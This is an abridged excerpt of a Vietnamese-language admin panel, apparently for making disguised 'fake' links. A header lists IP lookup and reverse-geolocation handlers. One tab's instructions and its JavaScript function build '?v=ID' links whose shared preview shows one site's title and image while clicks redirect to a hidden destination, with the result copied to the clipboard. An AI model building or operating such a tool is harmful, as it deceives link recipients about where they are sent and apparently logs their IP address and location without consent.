...
// ================= 2. API XỬ LÝ (SOI IP / REV-GEO / PUSH / LOCAL LINK / WEBHOOK) =================
...
<body class="flex h-screen overflow-hidden uppercase italic font-black text-[10px] tracking-tighter">
    <aside class="w-64 border-r border-slate-800 p-6 flex flex-col gap-4">
        ...
        <button onclick="st(8,this)" id="nb8" class="sidebar-btn text-pink-500">🔌 API LINK NỘI BỘ</button>
    ...
    <main class="flex-1 p-10 overflow-auto ios-safe">
        ...
        <div id="t8" class="tab-content max-w-5xl mx-auto space-y-8">
            ...
            <div class="grid lg:grid-cols-2 gap-8">
                <div class="card space-y-4 shadow-2xl">
                    <h3 class="text-pink-500 italic uppercase">🔌 FAKE LINK API NỘI BỘ</h3>
                    <p class="text-[8px] text-amber-400 normal-case italic">Chế độ chống spam: API nội bộ giới hạn 20 lần/phút, tự tạo link giới hạn 10 lần/phút cho mỗi phiên admin.</p>
                    <p class="text-[8px] text-slate-400 normal-case italic">Chỉ dùng API nội bộ để tự tạo link <code>?v=ID</code>; không gọi is.gd hoặc API rút gọn bên ngoài.</p>
                    ...
                    <hr class="border-slate-800">
                    <label class="text-pink-400 text-[8px] uppercase">API nội bộ đang dùng</label>
                    <input id="api_endpoint" readonly value="?action=auto_fake_link" class="text-pink-300 font-mono text-[8px]">
                    ...
                    <input id="api_short_url" readonly class="text-cyan-300 font-mono text-[8px]" placeholder="Kết quả link nội bộ sẽ hiện ở đây">
                ...
                <div class="card space-y-4">
                    ...
                    <p class="text-[8px] text-slate-400 normal-case italic leading-relaxed">1) Nhập link đích. 2) Nếu muốn preview khi chia sẻ giống trang của bạn, nhập web hiển thị cùng domain. 3) Bấm “Tự tạo nội bộ/full”; hệ thống tạo link <code>?v=ID</code>, gắn meta nội bộ và khi người xem bấm sẽ chuyển tới link đích.</p>
    ...
    <script>
        ...
        async function autoCreateFakeLink(){ const redir=document.getElementById('hidden_dest_url').value.trim(); const display_url=document.getElementById('display_meta_url').value.trim() || redir; if(!redir){ alert('Nhập link đích trước.'); return; } try{ const res=await fetch('?action=auto_fake_link',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({redir, display_url})}); const data=await res.json(); if(!data.ok) throw new Error(data.error || 'Lỗi không xác định'); document.getElementById('auto_campaign_url').value=data.url; document.getElementById('auto_short_url').value=data.short || data.url; document.getElementById('api_source_url').value=data.url; document.getElementById('api_short_url').value=data.short || data.url; document.getElementById('auto_meta_preview').value=`Title: ${data.meta?.title || ''}\nDesc: ${data.meta?.desc || ''}\nImage: ${data.meta?.img || ''}${data.warning ? '\nLưu ý: '+data.warning : ''}`; await navigator.clipboard.writeText(data.short || data.url); alert('Đã tự tạo link nội bộ và copy kết quả!'); }catch(e){ document.getElementById('auto_short_url').value='Lỗi: '+e.message; document.getElementById('auto_meta_preview').value='Lỗi: '+e.message; } }
